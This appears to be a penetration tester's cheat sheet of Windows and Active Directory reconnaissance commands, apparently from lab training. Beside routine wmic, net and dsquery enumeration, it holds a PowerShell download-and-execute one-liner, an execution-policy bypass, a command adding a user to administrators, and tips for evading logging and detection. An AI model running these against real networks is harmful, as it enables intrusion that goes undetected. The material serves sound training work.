## Env Commands For Host & Network Recon
```shell-session
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
```
OR
```shell-session
systeminfo
```

## Harnessing PowerShell
```shell-session
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```
```shell-session
Get-Module
Get-ExecutionPolicy -List
whoami
Get-ChildItem Env: | ft key,value
```

## Downgrade Powershell (PowerShell 3.0 and after will log in event viewer, so try to downgrade to 2.0 or lower if possible)
```shell-session
Get-host
powershell.exe -version 2
Get-host
get-module
```
- PowerShell Operational Log are found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
- Windows PowerShell log located at Applications and Services Logs > Windows PowerShell

## Firewall Checks
```shell-session
netsh advfirewall show allprofiles
```
**Windows Defender Check (from CMD.exe)
```shell-session
sc query windefend
```
**Configuration Settings
```shell-session
Get-MpComputerStatus
```

## Am I Alone?
```shell-session
qwinsta
```


## Network Information
```shell-session
arp -a
ipconfig /all
systeminfo
route print
netsh advfirewall show allprofiles
```
- arp -a
  - Lists all known hosts
- ipconfig /all
  - Prints out adapter settings for the host 
- systeminfo
- route print
  - Displays the routing table identifying known networks and layer three routes shared with the host
- netsh advfirewall show allprofiles
  - Displays the status of the host's firwall. We can determine if it is active and filtering traffic


## Windows Management Instrumentation (WMI)
Cheatsheet: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
```shell-session
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

## Net Commands (easy to detect, use net1 instead of net to not be detected)
- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements
```shell-session
net accounts
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group "Domain Controllers" /domain
net group <domain_group_name> /domain
net groups /domain
net localgroup
net localgroup administrators /domain
net localgroup Administrators
net localgroup administrators [username] /add
net share
net user <ACCOUNT_NAME> /domain
net user /domain
net user %username%
net use x: \computer\share
net view
net view /all /domain[:domainname]
net view \computer /ALL
net view /domain
```

## Dsquery
Found at: C:\Windows\System32\dsquery.dll
```shell-session
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl Description
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
- Last one searches for domain controller
- Second to last searches for users with no password required

**UAC values
Login script will execute = 1
Account is disabled = 2
Password not required = 32
Password can't change = 64
Encrypted text password allowed = 128
Normal user account = 512
Interdomain trust account = 2048
Domain workstation or member server = 4096
Domain controller = 8192
Password does not expire = 65536
Trust for impersonation = 524288
Account may not be impersonated = 1048576

**OID match strings
1. 1.2.840.113556.1.4.803 = value must match completely
2. 1.2.840.113556.1.4.804 = any bit in the chain matches
3. 1.2.840.113556.1.4.1941 = match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

**Logical Operators
&, |, !
(&(1) (2) (!3))
